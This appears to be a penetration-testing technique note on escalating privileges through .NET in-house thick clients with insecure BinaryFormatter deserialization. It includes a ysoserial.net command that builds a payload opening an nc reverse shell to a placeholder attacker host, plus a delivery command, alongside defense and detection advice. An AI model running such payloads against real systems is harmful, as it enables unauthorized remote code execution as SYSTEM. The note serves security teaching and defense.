# The in-house thick client is the privesc

Full writeup: [jperezduerto.info/techniques/dotnet-thick-client-deser-rce](https://jperezduerto.info/techniques/dotnet-thick-client-deser-rce/)

A custom in-house `.exe` on a share or in Program Files is the path, and its
server usually runs as SYSTEM. .NET decompiles cleanly, so the client gives you
a hardcoded auth bypass and a `BinaryFormatter` deserialization sink. The
protocol's own upload message becomes code execution as the service. ILSpy/dnSpy
and ysoserial.net are referenced, not carried. `send-message.py` speaks a
generic `VERB;<base64>` raw-socket protocol to deliver a payload you built.

## Work order

1. Decompile the DLLs, not just the exe (ILSpy / dnSpy / `ilspycmd`).
2. Read the auth check: in-house clients routinely carry a developer bypass.
3. Find the wire format (`VERB;<base64>` over a raw socket).
4. Find the sink: `BinaryFormatter.Deserialize`, `SoapFormatter`,
   `NetDataContractSerializer`, `LosFormatter` are all RCE by design.

## Forge

```bash
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\nc.exe ATTACKER 443 -e cmd"
# deliver through the app's own message, e.g. UPLOAD_ORDER;<base64>
python3 send-message.py TARGET PORT UPLOAD_ORDER "<base64payload>"
```

Match gadget to formatter; pin the ysoserial.net version (gadget chains are
build-specific). Confirm `whoami`; a lesser service account finishes via the
token-privilege hop (see windows-local-privesc).

## Defense

Do not deserialize untrusted input with a type-building serializer
(`BinaryFormatter` is deprecated for exactly this); use a data-only contract. No
hardcoded bypasses; authenticate/authorize and sign the protocol. Run the
service least-privileged, not SYSTEM. Obfuscation is not protection: .NET
decompiles trivially.

## Detection

The in-house service spawning `cmd`/`powershell`/`nc`; an oversized/unexpected
base64 payload on its port; a deserialization exception in its logs.

## Use

Authorized and educational use only: your own systems, a lab you control, or an
engagement with written permission.
